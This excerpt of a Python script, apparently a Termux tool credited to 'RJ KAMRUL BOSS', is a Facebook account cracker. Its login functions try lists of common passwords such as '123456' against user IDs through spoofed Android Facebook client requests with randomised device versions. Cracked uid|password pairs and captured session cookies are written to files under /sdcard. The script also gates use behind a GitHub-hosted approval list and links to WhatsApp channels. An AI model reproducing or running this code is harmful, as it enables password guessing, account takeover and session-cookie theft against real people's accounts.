...
\033[1;32m──────────────────────────────────────────────────
\033[1;32m[\033[1;31m✓\033[1;32m] AUTHOR    : RJ KAMRUL BOSS
\033[1;32m[\033[1;31m✓\033[1;32m] FACEBOOK : KAMRUL HASAN MAHI
...
alltimexudi =(""" \033[32;1m[-] ONLY APPROVAL SYSTEM WHATSAPP CHANNEL FOLLOW FOR    APPROVAL""")
...
def meyexudi():
  ...
  id = '-'.join(uuid)
  try:
    httpCaht = requests.get('https://github.com/kamrul-520/Approve.txt/blob/main/Approve.txt').text
    if id in httpCaht:
      print(fuckyoursali)
     ...
     # print(" \033[32;1m[+] Your Kay : "+id))
      ...
      input(' \033[1;30m╚══[𝟹] IF U WANT TO APPROVED  THEN PRESS ENTER ')
...
def menu():   
  ...
  #  print(f'\033[1;32m[\033[1;31m6\033[1;32m] JOIN MASSANGER GROUP')
    ...
    if select =='1':
        ...
        os.system('xdg-open https://wa.me/+8801319644658');menu()
    elif select =='5':
        os.system('xdg-open https://chat.whatsapp.com/GHcW6KYs56c2aVQPsCvsD4?mode=ems_copy_t');menu()
    elif select =='6':
        os.system('xdg-open https://whatsapp.com/channel/0029Vb6d5lB6hENw6TLYrO3h');menu()
    elif select =='0':
...
def login(uid):
    ...
    try:
        sys.stdout.write(f"\r\033[1;32m[\033[1;31mKAMRUL-999XD\033[1;32m] \033[1;35m{loop}\033[1;35m \033[1;32m|\033[1;32m OK{G}/{R}CP \033[1;32m|\033[1;32m {G}{len(ok)}/{R}{len(cp)} ")
        sys.stdout.flush()
        for pw in ["123456","1234567","12345678","123456789","123123","112233","1234567890"]:
            ...
            if "session_key" in rp:
                print(f"\r{R}[{R}KAMRUL-999CP{R}]{R} {uid} | {pw}")
                open("/sdcard/ASIF.txt","a").write(uid+"|"+pw+"\n")
                cps.append(uid)
                break 
            elif "www.facebook.com" in rp["error_msg"]:          
            	print(f"\r{R}[{G1}KAMRUL-999OK{R}]{G1} {uid} | {pw}")
            	open("/sdcard/KAMRUL-999cp.txt","a").write(uid+"|"+pw+"\n")
            	oks.append(uid)
            	break
            elif "Please Confirm Email" in str(rp):            
            	print(f"\r{R}[{G1}KAMRUL-999OK{R}]{G1} {uid} | {pw}")
            	open("/sdcard/KAMRUL-999ok.txt","a").write(uid+"|"+pw+"\n")
            	oks.append(uid)
            	break
            else:continue
        loop+=1
...
#__________________[ FILE METHOD M1 ]__________________#             
    def methodA(self,sid,name,psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r\033[1;93m[\033[0;95mKAMRUL-999M1\033[1;37m] \033[1;33m{loop}\033[1;33m \033[1;34m|\033[1;32m OK\033[1;32m | \033[1;31mCP \033[1;32m[{len(oks)}]\033[1;34m [\033[1;31m {len(cps)}\033[1;34m] \033[1;36m{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            android_version = f"Android {random.randint(4, 10)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
            facebook_version = f'{random.randint(10,432)}.0.0.{random.randint(11,99)}.{random.randint(1,200)}'
            fbbv = str(random.randint(10000000, 99999999))
...
'Content-Length': str(len(content_lenght))}
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r{R} [KAMRUL-999-OK] {sid} | {ps} {S}\n[cookie[🔥]={ckkk}")
                    oks.append(sid)
                    open('/sdcard/KAMRUL-999_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/Asif_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    print(f"\r{A} [KAMRUL-999-CP] {sid} | {ps} {S}")
                    cps.append(sid)
                    #open('/sdcard/KAMRUL-999_CP.txt','a').write(sid+'|'+ps+'\n')
                    cps.append(sid)
                else:
                    continue
            loop+=1
...
#__________________[ FILE METHOD M2 ]__________________#             
    def methodB(self,sid,name,psw):
        try:
            ...
            sys.stdout.write(f"\r\033[1;32m[\033[1;31mKAMRUL-999M2\033[1;32m] \033[1;36m{loop}\033[1;35m \033[1;34m|\033[1;32m OK\033[1;34m|\033[1;31mCP \033[1;32m{len(oks)}\033[1;34m|\033[1;31m{len(cps)} \033[1;34m| \033[1;36m{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            android_version = f"Android {random.randint(4, 10)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
            facebook_version = f'{random.randint(10,432)}.0.0.{random.randint(11,99)}.{random.randint(1,200)}'
            fbbv = str(random.randint(10000000, 99999999))
            ...
            for pw in psw:
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r\r{G1}[KAMRUL-999OK] {sid} | {ps} ")
                #    print(f"\r\r{G1}[COOKIES-💛]>{B}{cookie} ")
                    open('/sdcard/KAMRUL-999M2-FILE-OK.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    oks.append(sid)
                    break
                elif 'www.facebook.com' in q['error']['message']:
                   # print(f"\r\r{M}[KAMRUL-999CP] {sid} | {ps} ")
                    open('/sdcard/KAMRUL-999M2-FILE-cp.txt','a').write(sid+'|'+ps+'\n')
                    cps.append(sid)
                else:
                    continue
            loop+=1
 ...
 #__________________[ FILE METHOD M3 ]__________________#             
    ...
    def methodC(self,sid,name,psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r\033[1;32m[\033[1;31mKAMRUL-999M3\033[1;32m] \033[1;36m{loop}\033[1;35m \033[1;34m|\033[1;32m OK\033[1;34m|\033[1;31mCP \033[1;32m{len(oks)}\033[1;34m|\033[1;31m{len(cps)} \033[1;34m| \033[1;36m{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            android_version = f"Android {random.randint(4, 10)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
            facebook_version = f'{random.randint(10,432)}.0.0.{random.randint(11,99)}.{random.randint(1,200)}'
            fbbv = str(random.randint(10000000, 99999999))
...
def randm(ids,psd):
    ...
    sys.stdout.write(f"\r\033[1;32m[\033[1;31mKAMRUL-999RNDM\033[1;32m] \033[1;35m{loop}\033[1;35m \033[1;32m|\033[1;32m OK{G}/{R}CP \033[1;32m|\033[1;32m {G}{len(ok)}/{R}{len(cp)} ")
    sys.stdout.flush()
    try:
        for pas in psd:
            data={
            ...
            if 'access_token' in q:
                uid = str(q['uid'])
                ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ASIFb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ASIFb};{ckkk}"
                print(f'\r\r{R1}[KAMRUL-999OK] {uid} | {pas}')
                print(f'\r\r{G1}[COOKIE]{R} {cookie}')
                open('/sdcard/KAMRUL-999RNDM-OK.txt','a').write(uid+'|'+pas+'|'+cookie+'\n')
                ok.append(uid)
                break
                continue
        loop+=1
